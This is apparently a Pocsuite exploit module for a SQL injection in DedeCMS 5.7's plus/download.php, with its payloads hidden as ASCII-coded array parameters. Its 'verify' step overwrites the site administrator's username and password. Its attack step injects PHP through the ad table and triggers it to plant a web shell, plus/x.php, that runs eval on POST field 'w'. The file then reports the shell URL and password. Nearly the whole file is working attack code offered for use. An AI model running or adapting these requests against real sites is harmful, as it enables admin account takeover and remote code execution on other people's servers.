#!/usr/bin/env python
#!coding: utf-8
import re

from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class Fuckdede(POCBase):
	vulID='1'
	version = '1'
	author = ['fengxuan']
	vulDate = '2016-2-25'
	createDate = '2016-2-25'
	updateDate = '2016-2-25'
	references = ['http://www.evalshell.com', 'http://www.cnseay.com/2963/']
	name = 'dedecms plus/download.php 注入漏洞利用EXP'
	appPowerLink = 'http://www.dedecms.cn/'
	appName = 'dedecms'
	appVersion = '5.7'
	vulType = 'SQL Injection'
	desc = '''
           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
           带入了SQL语句中，可以通过字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
           此注入为报错注入，可以通过UpdateXML函数进行注入。
    '''
	samples = ['']

	def _verify(self):
		result = {}
		target = self.url + "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=120&arrs2[]=117&arrs2[]=97&arrs2[]=110&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35"
		response = req.get(target)
		content = response.content
		if content.find('Safe Alert: Request Error step 2!') > 0:
			result = {'VerifyInfo':{}}
			result['VerifyInfo']['URL'] = self.url
			result['VerifyInfo']['username'] = 'xuan'
			result['VerifyInfo']['password'] = 'admin'
		return self.parse_result(result)

	def _attack(self):
		result = {}
		target = self.url + '/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=32&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=61&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=64&arrs2[]=102&arrs2[]=111&arrs2[]=112&arrs2[]=101&arrs2[]=110&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=120&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=97&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=64&arrs2[]=102&arrs2[]=119&arrs2[]=114&arrs2[]=105&arrs2[]=116&arrs2[]=101&arrs2[]=40&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=44&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=119&arrs2[]=93&arrs2[]=41&arrs2[]=32&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=102&arrs2[]=117&arrs2[]=99&arrs2[]=107&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=102&arrs2[]=99&arrs2[]=108&arrs2[]=111&arrs2[]=115&arrs2[]=101&arrs2[]=40&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35'
		req.get(target)
		req.get(self.url + '/plus/ad_js.php?aid=1&nocache=1')
		shell = req.get(self.url + '/plus/x.php')
		if shell.content.find('w'):
			result = {'VerifyInfo':{}}
			result['VerifyInfo']['shell'] = self.url + '/plus/x.php'
			result['VerifyInfo']['password'] = 'w'
		return self.parse_result(result)

	def parse_result(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail("Internet Nothing returned")
		return output

register(Fuckdede)








